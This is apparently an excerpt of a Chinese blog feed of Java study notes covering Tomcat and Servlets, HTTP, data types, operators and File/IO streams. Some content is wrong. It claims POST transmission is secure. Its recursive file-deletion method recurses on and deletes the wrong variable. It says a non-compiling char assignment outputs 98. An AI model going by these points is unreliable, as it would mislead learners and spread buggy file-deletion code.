    <content><![CDATA[<h2 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h2><p>Servlet/Jsp容器，轻量级服务中间件</p>
<h4 id="idea配置"><a href="#idea配置" class="headerlink" title="idea配置"></a>idea配置</h4><ul>
<li>导入Tomcat 8.5.3.jar包</li>
</ul>
<h4 id="Tomcat主要目录："><a href="#Tomcat主要目录：" class="headerlink" title="Tomcat主要目录："></a>Tomcat主要目录：</h4><ul>
<li>bin 可执行文件</li>
<li>lib  tomcat可运行的jar文件</li>
<li>logs tomcat运行的日志文件</li>
<li>webapps 存放编写的应用</li>
</ul>
<p>URL:统一资源定位符</p>
<p>URI：统一资源标识符</p>
<h3 id="Http协议"><a href="#Http协议" class="headerlink" title="Http协议"></a>Http协议</h3><p>HyperText Transfer Protocol超文件传输协议，传输Html文件</p>
<p>用于定义Web浏览器与Web服务器之间交换数据的过程及数据本身的格式</p>
<h3 id="请求部分"><a href="#请求部分" class="headerlink" title="请求部分"></a>请求部分</h3><h4 id="请求消息行"><a href="#请求消息行" class="headerlink" title="请求消息行"></a>请求消息行</h4><ol>
<li>Get 明文传输，不安全，数据量有限</li>
<li>Post 暗文传输，安全</li>
</ol>
<h4 id="请求消息头"><a href="#请求消息头" class="headerlink" title="请求消息头"></a>请求消息头</h4><p><strong>Tomcat原理</strong></p>
<p>Servlet是java编写服务器端小程序，功能是交互式浏览和修改数据，生成动态web资源</p>
<ul>
<li>请求到达server端，server根据url映射<code>Map&lt;url,servletname&gt;</code>得到相应的servlet</li>
<li>判断Servlet实例是否存在，不存在则加载和实例化Servlet并调用init方法</li>
<li>server创建request/response对象，调用servlet的service方法(doXXX方法)</li>
<li>从request对象获取请求参数，处理将结果给通过response返回</li>
<li>Server不再需要Servlet时，调用destory()方法</li>
</ul>
]]></content>
      <tags>
        <tag>Servlet</tag>
      </tags>
  </entry>
  <entry>
    <title>标识符&amp;数据类型</title>
    <url>/2020/11/11/02%E6%A0%87%E8%AF%86%E7%AC%A6&amp;%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B/</url>
    <content><![CDATA[<blockquote>
<p>ASCII表是Unicode字符集的子集</p>
</blockquote>
<blockquote>
<p><strong>byte,short,char这几个数据类型一旦参与任何形式的运算，都会先将这个数据类型自动的提升到int类型在去赋值</strong></p>
</blockquote>
<h3 id="一、元字符"><a href="#一、元字符" class="headerlink" title="一、元字符"></a>一、元字符</h3><blockquote>
<p>​            \n换行符       \t制表符(8个字符)   \ &quot;转义字符</p>
<p>​            \x 表示十六进制数         \ 表示八进制数</p>
<p>​             \u后面加上四个十六进制代码来表示<strong>Unicode</strong>字符,long a=’\u00FF’</p>
<p>​             \b 退格  ，\f换页  ，\r回车</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">\n换行符</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;Hello World!!&quot;</span>);   <span class="comment">//先输出，在换行</span></span><br><span class="line">    System.out.println(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    System.out.print(<span class="string">&quot;你好，世界！！&quot;</span>);        <span class="comment">//输出但不换行</span></span><br><span class="line">    System.out.print(<span class="string">&quot;你好，世界\n&quot;</span>);        <span class="comment">//输出再换行</span></span><br><span class="line">    System.out.println(<span class="string">&quot;-----------&quot;</span>);</span><br><span class="line">    System.out.print(<span class="string">&quot;\n你好，北京&quot;</span>);    <span class="comment">//先换行再输出</span></span><br><span class="line">    System.out.print(<span class="string">&quot;你好\n上海&quot;</span>);</span><br><span class="line">    System.out.print(<span class="string">&quot;你好 广州！！！\n\n&quot;</span>);  <span class="comment">//先输出，再换俩行</span></span><br><span class="line">    System.out.println(<span class="string">&quot;----------&quot;</span>);</span><br><span class="line">    System.out.println(<span class="string">&quot;你好深圳\n&quot;</span>);       <span class="comment">//先输出，在换俩行</span></span><br><span class="line">    System.out.println(<span class="string">&quot;-------------&quot;</span>);</span><br><span class="line">    System.out.print(<span class="string">&quot;\n\n你好 纽约&quot;</span>);      <span class="comment">//先换俩行，在输出</span></span><br><span class="line">    System.out.println(<span class="string">&quot;\n-------------&quot;</span>);</span><br><span class="line">    System.out.print(<span class="string">&quot;Hello World!!!\n你好 世界！！\n你好 中国！！！&quot;</span>);   <span class="comment">//先换行，在输出</span></span><br><span class="line">    System.out.println(<span class="string">&quot;\n----------------&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">\t制表符</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;张无忌\t19\t\t长枪&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;黄飞鸿\t20\t\t无影脚&quot;</span>);</span><br><span class="line">        System.out.println(<span class="string">&quot;李寻欢\t21\t\t飞刀&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">\转义字符</span><br><span class="line">      System.out.println(<span class="string">&quot;\&quot;hhh\&quot;&quot;</span>);</span><br><span class="line">      System.out.println(<span class="string">&quot;D:\\Game&quot;</span>);   <span class="comment">//在路径加个斜杠转义</span></span><br><span class="line"></span><br><span class="line">\u后面加上十六进制代码来表示Unicode字符</span><br><span class="line"><span class="keyword">char</span> a=<span class="string">&#x27;\u00FF&#x27;</span>;</span><br><span class="line"><span class="keyword">long</span> b=<span class="string">&#x27;\u0022&#x27;</span>;   <span class="comment">//char--&gt;long</span></span><br></pre></td></tr></table></figure>



<h3 id="二、标识符"><a href="#二、标识符" class="headerlink" title="二、标识符"></a>二、标识符</h3><blockquote>
<p>由26个英语字母a-Z，0-9，$,  _组成，可以为中文</p>
</blockquote>
<ul>
<li><p><strong>不能以数字开头</strong> </p>
</li>
<li><p><strong>不能使用关键字和保留关键字</strong>（go ，const常量）</p>
</li>
<li><p><strong>this_is_Ok可以是标识符</strong></p>
</li>
</ul>
<img src="https://csn.damyoung.cn/image-20200715093232699.png" alt="image-20200715093232699" style="zoom:80%;" />



<h3 id="三、关键字"><a href="#三、关键字" class="headerlink" title="三、关键字"></a>三、关键字</h3><blockquote>
<p>static 、void、short、interface、final</p>
</blockquote>
<h3 id="四、常量"><a href="#四、常量" class="headerlink" title="四、常量"></a>四、常量</h3><p><img src="https://csn.damyoung.cn/image-20200715092453006.png" alt="image-20200715092453006"></p>
<p>​                                                            空常量：null</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">final</span> <span class="keyword">double</span> Pi=<span class="number">3.14159</span>;       <span class="comment">//常量，不可再赋值</span></span><br><span class="line"><span class="keyword">double</span> pi=<span class="number">3.13</span>; 				<span class="comment">//变量</span></span><br></pre></td></tr></table></figure>



<h3 id="五、变量"><a href="#五、变量" class="headerlink" title="五、变量"></a>五、变量</h3><blockquote>
<p>格式:赋值类型 变量名=常量值;  声明–&gt;赋值–&gt;使用</p>
</blockquote>
<p>​                <strong>就是给类或者接口等取名字时候用的字符序列</strong></p>
<ul>
<li>一个变量只能在同一作用域作用，同一作用域不能出同名变量，int a=10;</li>
<li>类成员变量、局部变量(<strong>在作用域里面才能用</strong>)</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//变量的使用</span></span><br><span class="line"><span class="keyword">int</span> sum=<span class="number">133</span>;    <span class="comment">//输出到控制台</span></span><br><span class="line"><span class="keyword">int</span> sum1=sum;    <span class="comment">//给其他变量赋值</span></span><br><span class="line"><span class="keyword">int</span> sum2=sum+sum1;    <span class="comment">//参与运算</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//多个变量连续赋值</span></span><br><span class="line">  <span class="keyword">int</span> a,b,c;  a=b=c=<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">int</span> a3,b3,c3=<span class="number">1</span>; a3=b3=c3+<span class="number">1</span>;</span><br><span class="line">  <span class="keyword">boolean</span> a= b==<span class="number">1</span>; </span><br><span class="line"> <span class="comment">//int a=b=c=10;,只声明了变量a;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="六、数据类型"><a href="#六、数据类型" class="headerlink" title="六、数据类型"></a>六、数据类型</h3><h4 id="1、String"><a href="#1、String" class="headerlink" title="1、String"></a>1、String</h4><p>字符串是一个类，</p>
<p><strong>属于引用数据类型</strong>，String str=new String(“好的”);                        </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//String字符串连接,左边的数据是字符串，则后面的数据全部都是字符串</span></span><br><span class="line">System.out.println(<span class="string">&quot;hello&quot;</span>+<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>);  <span class="comment">//helloa1</span></span><br><span class="line">System.out.println(<span class="string">&quot;hello&quot;</span>+(<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>));  <span class="comment">//hello98</span></span><br><span class="line">System.out.println(<span class="string">&#x27;a&#x27;</span>+<span class="number">1</span>+<span class="string">&quot;hello&quot;</span>);  <span class="comment">//98hello</span></span><br><span class="line">System.out.println(<span class="string">&quot;5+5=&quot;</span>+<span class="number">5</span>+<span class="number">5</span>);  <span class="comment">//5+5=55</span></span><br><span class="line">System.out.println(<span class="number">5</span>+<span class="number">5</span>+<span class="string">&quot;=5+5&quot;</span>);  <span class="comment">//10=5+5//10=5+5</span></span><br></pre></td></tr></table></figure>



<h4 id="2、整数类型"><a href="#2、整数类型" class="headerlink" title="2、整数类型    "></a>2、整数类型    <img src="https://csn.damyoung.cn/image-20200715091835542.png" alt="image-20200715091835542"></h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//整型</span></span><br><span class="line"><span class="keyword">int</span> a1,b1,c1;  <span class="comment">//声明多个变量</span></span><br><span class="line"><span class="keyword">long</span> a2=<span class="number">100000003333L</span>;   <span class="comment">//长整型超出范围后面要加L</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//浮点型</span></span><br><span class="line"><span class="keyword">double</span> f2=<span class="number">2.34</span>;  		<span class="comment">//浮点型默认为double</span></span><br><span class="line"><span class="keyword">double</span> f3=<span class="number">0.7E-3</span>;		<span class="comment">//0.7*10^-3</span></span><br><span class="line"><span class="keyword">float</span> f1=<span class="number">2.3f</span>;          <span class="comment">//float型后面要加f</span></span><br><span class="line"><span class="keyword">float</span> foo = <span class="number">42e1</span>;	<span class="comment">//错误，科学计算法默认是double类型</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//字符型</span></span><br><span class="line"><span class="keyword">char</span> c=<span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"><span class="keyword">char</span> b=<span class="number">65</span>;  <span class="comment">//根据ASCII编码，48--&gt;0  65--&gt;A  97--&gt;a</span></span><br><span class="line"><span class="keyword">char</span> d=(<span class="keyword">char</span>)(c+<span class="number">1</span>);   <span class="comment">//输出为d</span></span><br><span class="line"><span class="keyword">char</span> f=c+<span class="number">1</span>;   <span class="comment">//结果为98，输出为int类型</span></span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//布尔类型，只有ture和false</span></span><br><span class="line"><span class="keyword">boolean</span> a=<span class="keyword">true</span>;</span><br><span class="line"><span class="keyword">boolean</span> d=<span class="keyword">false</span>;</span><br></pre></td></tr></table></figure>

<h4 id="3、类型转换"><a href="#3、类型转换" class="headerlink" title="3、类型转换"></a>3、类型转换</h4><ul>
<li><p>自动类型转换：从小到大</p>
</li>
<li><p>强制类型转换：从大的数据到小的数据，<strong>boolean类型、String不参与任何形式转换</strong></p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//自动类型转换，从小到大</span></span><br><span class="line"><span class="keyword">double</span> num1=-<span class="number">1</span>;   		<span class="comment">//int--&gt;double</span></span><br><span class="line"><span class="keyword">float</span> num2=<span class="number">0x0123</span>;		<span class="comment">//int--&gt;float</span></span><br><span class="line">System.out.println(num1);   <span class="comment">//double 8个字节，int 4个字节</span></span><br><span class="line"><span class="comment">//强制类型转换</span></span><br><span class="line"><span class="keyword">int</span> i=(<span class="keyword">int</span>)<span class="number">2.2</span>; <span class="comment">//输出为2，强制类型转换会造成精度丢失</span></span><br><span class="line"><span class="keyword">int</span> i1=<span class="number">264</span>;    <span class="comment">//00000000 00000000 00000001 00001000</span></span><br><span class="line"><span class="keyword">byte</span> b=(<span class="keyword">byte</span>)i1;  <span class="comment">//精度丢失，剩下00001000--&gt;8</span></span><br><span class="line">System.out.println(b);</span><br></pre></td></tr></table></figure>



<ul>
<li>二进制数前面加<strong>0b</strong>，十六进制加<strong>0x</strong>，八进制加0</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> num1=<span class="number">0b0101</span>;  <span class="comment">//二进制</span></span><br><span class="line"><span class="keyword">int</span> num2=<span class="number">011</span>;     <span class="comment">//八进制</span></span><br><span class="line"><span class="keyword">int</span> num3=<span class="number">0x0b</span>;    <span class="comment">//十六进制</span></span><br></pre></td></tr></table></figure>

<ul>
<li>根据ASCII编码，<strong>48–&gt;0  65–&gt;A  97–&gt;a</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">char</span> b=<span class="number">65</span>;          <span class="comment">//根据ASCII编码，48--&gt;0  65--&gt;A  97--&gt;a</span></span><br></pre></td></tr></table></figure>



<p>误区：类体只能有声明和方法，不能存在语句；</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 变量 </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i;		<span class="comment">//java为强类型语言，在类中自动赋值</span></span><br><span class="line">    i=<span class="number">1</span>;  		<span class="comment">//错误，类体中不能有语句</span></span><br><span class="line">  &#125;      <span class="comment">//改为int i=1; </span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//方法中可分开写</span></span><br><span class="line">  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> 变量 </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//变量先声明再赋值</span></span><br><span class="line">   <span class="comment">// int a=1;</span></span><br><span class="line">        <span class="keyword">int</span> a;</span><br><span class="line">        a=<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="https://csn.damyoung.cn/image-20200715165643970.png" alt="image-20200715165643970" style="zoom: 67%;" />

<h3 id="七、运算符"><a href="#七、运算符" class="headerlink" title="七、运算符"></a>七、运算符</h3><blockquote>
<p>单目运算符〉算术运算符〉比较运算符〉逻辑运算符（除了“非”运算）</p>
</blockquote>
<blockquote>
<p><strong>byte,short,char这几个数据类型一旦参与任何形式的运算，都会先将这个数据类型自动的提升到int类型在去赋值</strong></p>
</blockquote>
<h4 id="1、算术运算符"><a href="#1、算术运算符" class="headerlink" title="1、算术运算符"></a>1、算术运算符</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//加法运算</span></span><br><span class="line"><span class="keyword">int</span> num1=<span class="number">10</span>;</span><br><span class="line"><span class="keyword">double</span> num2=<span class="number">12.3</span>;</span><br><span class="line"><span class="keyword">double</span> sum=num1+num2; <span class="comment">//要由double接收，不存在强转</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//除法</span></span><br><span class="line"><span class="keyword">int</span> a=<span class="number">5</span>;<span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line">System.out.println(a/b);     <span class="comment">//输出为2</span></span><br><span class="line">System.out.println(a*<span class="number">1.0</span>/b); <span class="comment">//输出为2.5  </span></span><br><span class="line">System.out.println(<span class="number">5.0</span>/<span class="number">2</span>);  <span class="comment">//输出为2.5</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//%取余，操作数可为浮点数</span></span><br><span class="line"><span class="keyword">double</span> a=<span class="number">52.2</span>;</span><br><span class="line"><span class="keyword">double</span> i=a%<span class="number">10</span>;</span><br><span class="line">System.out.println(i);</span><br><span class="line"><span class="comment">//-7%3和-7%-3结果还是-1，可见求余结果和%右边的数正负无关</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//自增</span></span><br><span class="line"><span class="keyword">int</span> a1=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b=++a1;     <span class="comment">//输出为2，</span></span><br><span class="line"><span class="keyword">int</span> c=a1++;   <span class="comment">//输出为1</span></span><br><span class="line">System.out.println(b);</span><br><span class="line"></span><br><span class="line"> <span class="comment">//byte参与运算</span></span><br><span class="line">  <span class="keyword">byte</span> a=<span class="number">10</span>;</span><br><span class="line">  <span class="keyword">byte</span> b=<span class="number">11</span>;</span><br><span class="line">  <span class="keyword">int</span> c=a+b;  <span class="comment">//byte 类型参与运算自动提升为int类型</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="2、赋值运算符"><a href="#2、赋值运算符" class="headerlink" title="2、赋值运算符"></a>2、赋值运算符</h4><blockquote>
<p><strong>赋值左边不能为表达式。a=b+3=c错误;</strong></p>
<p><strong>扩展运算符本身就隐藏一个强制类型转换的问题</strong></p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">赋值运算符,+= ,-=,/=，*=，%=(取余，操作数必须为整数)</span><br></pre></td></tr></table></figure>

<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> x=<span class="number">1</span>;<span class="keyword">int</span> y=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> z=x*y;</span><br><span class="line">System.out.println(z);  <span class="comment">//输出2.0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//扩展展运算符本身就隐藏一个强制类型转换的问题</span></span><br><span class="line">  <span class="keyword">int</span> sum1=<span class="number">10</span>;</span><br><span class="line">  <span class="keyword">double</span> sum2=<span class="number">1.2</span>;</span><br><span class="line">  sum1+=sum2; <span class="comment">//输出为11，赋值运算符本身带有强制类型转换</span></span><br><span class="line">  <span class="keyword">int</span> sum3=sum1+sum2;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="3、比较运算符"><a href="#3、比较运算符" class="headerlink" title="3、比较运算符"></a>3、比较运算符</h4><p>结果都是boolean型 == ， ！=，&gt;=</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String str1=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">String str2=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line">System.out.println(str1==str2);</span><br><span class="line">System.out.println(str1.equals(str2));</span><br></pre></td></tr></table></figure>



<h4 id="4、逻辑运算符"><a href="#4、逻辑运算符" class="headerlink" title="4、逻辑运算符"></a>4、逻辑运算符</h4><p>逻辑与&amp;  逻辑或|，逻辑非 ！，^逻辑异或</p>
<p>&amp;&amp;具备短路效果，即左边的数据如果为false，那么不在执行右边的数据</p>
<p>||短路或</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a=<span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b=<span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> c=<span class="number">1</span>;</span><br><span class="line">System.out.println(a&lt;b&amp;a&gt;b); <span class="comment">//ture&amp;false=false</span></span><br><span class="line">System.out.println(a&gt;b&amp;&amp;a&lt;b);  <span class="comment">//短路与，当第一个为false时，后面不再运行</span></span><br><span class="line">System.out.println(a&lt;b|a&gt;b); <span class="comment">//true|false=ture</span></span><br><span class="line">System.out.println(a&lt;b||a&gt;b);  <span class="comment">//短路或，当第一个为ture时，后面不再运行</span></span><br><span class="line">System.out.println(a&lt;b^a&gt;b);  <span class="comment">//ture^false=ture  不同为ture</span></span><br><span class="line">System.out.println(!(a&lt;b));   <span class="comment">//!true=false</span></span><br><span class="line"></span><br><span class="line">System.out.println((a++==<span class="number">2</span>)&amp;(b++==<span class="number">2</span>)); <span class="comment">//false&amp;ture=false 输出a=2，b=3</span></span><br><span class="line">System.out.println((a++==<span class="number">2</span>)&amp;&amp;(b++==<span class="number">2</span>)); <span class="comment">//a=2,b=2</span></span><br></pre></td></tr></table></figure>



<h4 id="5、位运算符"><a href="#5、位运算符" class="headerlink" title="5、位运算符"></a>5、位运算符</h4><p>位运算符，<strong>转化为二进制补码比较,  最高位为1要取反+1</strong></p>
<p>按位与&amp;，按位或|，按位取反~，按位异或^</p>
<p>&lt;&lt;左移（右边空位补0），&gt;&gt;右移</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> A=<span class="number">60</span>; <span class="comment">//二进制补码0011 1100</span></span><br><span class="line"><span class="keyword">int</span> B=<span class="number">4</span>;  <span class="comment">//二进制补码0000 0100</span></span><br><span class="line">System.out.println(A&amp;B);  <span class="comment">//按位与，0000 0100  --&gt;4</span></span><br><span class="line">System.out.println(A|B);  <span class="comment">//按位或，0011 1100   --&gt;60</span></span><br><span class="line">System.out.println(A^B);  <span class="comment">//按位异或，0011 1000  --&gt;56</span></span><br><span class="line">System.out.println(~A);  <span class="comment">//按位取反，1100 0011 --&gt;1011 1101--&gt;-61负数，除符号位取反+1</span></span><br><span class="line">System.out.println(B&gt;&gt;<span class="number">1</span>); <span class="comment">//右移一位0000 0010 --&gt;2</span></span><br></pre></td></tr></table></figure>



<h4 id="6、三目运算符"><a href="#6、三目运算符" class="headerlink" title="6、三目运算符"></a>6、三目运算符</h4><blockquote>
<p>int max=a&gt;b? a:b; </p>
<p>String height=a&gt;b? “a大”:”b大”</p>
</blockquote>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> a = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">int</span> b = <span class="number">2</span>;</span><br><span class="line"><span class="keyword">int</span> max=a&gt;b?a:b;   <span class="comment">// 如果a&gt;b为ture返回a，否则返回b</span></span><br><span class="line">System.out.println(<span class="string">&quot;俩个数最大值是：&quot;</span>+max);</span><br></pre></td></tr></table></figure>





]]></content>
      <categories>
        <category>javaSe</category>
      </categories>
      <tags>
        <tag>javaSe</tag>
      </tags>
  </entry>
  <entry>
    <title>IO流</title>
    <url>/2020/11/11/03IO%E6%B5%81/</url>
    <content><![CDATA[<h2 id="一、File工具类"><a href="#一、File工具类" class="headerlink" title="一、File工具类"></a>一、File工具类</h2><blockquote>
<p>通过IO流来对文件进行操作</p>
</blockquote>
<h3 id="1、概述"><a href="#1、概述" class="headerlink" title="1、概述"></a>1、概述</h3><h4 id="1-1-分隔符"><a href="#1-1-分隔符" class="headerlink" title="1.1 分隔符"></a>1.1 分隔符</h4><ul>
<li><p>路径分隔符    pathSeparator（；）</p>
</li>
<li><p>名称分隔符     separator(Windows \   linux  /)</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String path=<span class="string">&quot;D:\\TopView\\java&quot;</span>;</span><br><span class="line">path=<span class="string">&quot;D:&quot;</span>+File.separator+<span class="string">&quot;TopView&quot;</span>+File.separator+<span class="string">&quot;java&quot;</span>;</span><br></pre></td></tr></table></figure>

<h4 id="1-2-路径"><a href="#1-2-路径" class="headerlink" title="1.2 路径"></a>1.2 路径</h4><ul>
<li>绝对路径：有盘符</li>
<li>相对路径:   相对项目而言，无盘符</li>
</ul>
<h3 id="2、构造方法"><a href="#2、构造方法" class="headerlink" title="2、构造方法"></a>2、构造方法</h3><ul>
<li>File(String pathname);            </li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File f=<span class="keyword">new</span> File(<span class="string">&quot;E:\\aa&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>File(String parent, String child)</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File f1=<span class="keyword">new</span> File(<span class="string">&quot;E:&quot;</span>,<span class="string">&quot;A.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<ul>
<li>File(File parent,String child);</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File f=<span class="keyword">new</span> File(<span class="string">&quot;E:\\aa&quot;</span>);</span><br><span class="line">File f2=<span class="keyword">new</span> File(f,<span class="string">&quot;test3.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<h3 id="3、普通方法"><a href="#3、普通方法" class="headerlink" title="3、普通方法"></a>3、普通方法</h3><h4 id="3-1-创建"><a href="#3-1-创建" class="headerlink" title="3.1 创建"></a>3.1 创建</h4><p><code>createNewFile()</code> 创建新文件，返回boolean类型</p>
<p><code>mkdir()</code>: 创建目录（文件夹），不能越级创建（中间目录不会被创建）</p>
<p><code>mkdirs()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file=<span class="keyword">new</span> File(<span class="string">&quot;E:\\a\\b&quot;</span>);</span><br><span class="line"><span class="comment">//        System.out.println(file.mkdir()); //只能创建单级目录</span></span><br><span class="line">System.out.println(file.mkdirs()); <span class="comment">//mkdirs()</span></span><br></pre></td></tr></table></figure>

<h4 id="3-2-删除"><a href="#3-2-删除" class="headerlink" title="3.2 删除"></a>3.2 删除</h4><p><code>delete()</code>: 删除,文件夹必须是空才能删除（先删除文件在删除文件夹）</p>
<h4 id="3-3-获取"><a href="#3-3-获取" class="headerlink" title="3.3 获取"></a>3.3 获取</h4><p><code>listFiles()</code>:返回所有文件(含文件夹)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">File file=<span class="keyword">new</span> File(<span class="string">&quot;F:\\&quot;</span>);</span><br><span class="line">File[] files=file.listFiles();</span><br><span class="line"><span class="keyword">for</span>(File s:files)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!s.isFile()) &#123;</span><br><span class="line">       System.out.println(s.getName());</span><br><span class="line">     &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>list()</code> :  返回的String数组</p>
<p>getPath()     getAbsolutePath() 获取绝对路径</p>
<p>getName() 获取文件名     </p>
<p>length() 获取文件的长度</p>
<h4 id="3-4-判断"><a href="#3-4-判断" class="headerlink" title="3.4 判断"></a>3.4 判断</h4><p>isFile()     isDirectory()是否是目录      exists()</p>
<h4 id="3-5-重命名"><a href="#3-5-重命名" class="headerlink" title="3.5 重命名"></a>3.5 重命名</h4><p>renameTo(File)</p>
<ul>
<li>路径相同，则是重命名</li>
<li>路径不同，则重命名且剪切（复制并删除）</li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//旧命名</span></span><br><span class="line">File file=<span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>);</span><br><span class="line"> <span class="comment">//新命名</span></span><br><span class="line">File file1=<span class="keyword">new</span> File(<span class="string">&quot;&quot;</span>);</span><br><span class="line">file.renameTo(file1)</span><br></pre></td></tr></table></figure>

<h4 id="3-6-递归"><a href="#3-6-递归" class="headerlink" title="3.6 递归"></a>3.6 递归</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">dd</span><span class="params">(File file)</span></span>&#123;</span><br><span class="line">    File[] fileArray=file.listFiles();</span><br><span class="line">    <span class="keyword">if</span>(fileArray!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(File file1:fileArray)&#123;</span><br><span class="line">            <span class="keyword">if</span> (file.isDirectory())&#123;</span><br><span class="line">                dd(file);</span><br><span class="line">            &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">                System.out.println(<span class="string">&quot;删除&quot;</span>+file.getName()+file.delete());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://csn.damyoung.cn/image-20200804203021432.png" alt="image-20200804203021432"></p>
<h2 id="二、IO流"><a href="#二、IO流" class="headerlink" title="二、IO流"></a>二、IO流</h2><h3 id="0、IO流的分类"><a href="#0、IO流的分类" class="headerlink" title="0、IO流的分类"></a>0、IO流的分类</h3><ul>
<li>按照流的流向，分为<strong>输入流</strong>和<strong>输出流</strong></li>
<li>按照操作单元划分，分为<strong>字节流</strong>和<strong>字符流</strong></li>
<li>按照流的角色划分为<strong>节点流</strong>和<strong>处理流</strong></li>
</ul>
<blockquote>
<p>字符流、缓冲流一般都要刷新flush();</p>
<p><strong>输入输出是相对java编译器而言</strong></p>
</blockquote>
<ul>
<li>字节流：1个字节 InputStream OutputStream</li>
<li>字符流：2个字节 Reader Writer</li>
<li>高效流：带有缓冲区，处理速度比较高效</li>
<li>转换流：字节转换为字符</li>
</ul>
<blockquote>
<p>close():关闭IO连接通道，并且释放当前的系统资源,再次使用只能再次创建流</p>
</blockquote>
<h3 id="1、字节流"><a href="#1、字节流" class="headerlink" title="1、字节流"></a>1、字节流</h3><p>字节流：字节0-255范围</p>
<p>构造方法： InputStream f1=new FileInputStream(File file,boolean append)</p>
<h4 id="1、InputStream"><a href="#1、InputStream" class="headerlink" title="1、InputStream"></a>1、InputStream</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">InputStream f1=<span class="keyword">new</span> FileInputStream(<span class="string">&quot;F:\\Javacode\\Stream\\input.txt&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>read(byte[] b):通过游标移动来读取，若是字符不存在返回-1；</p>
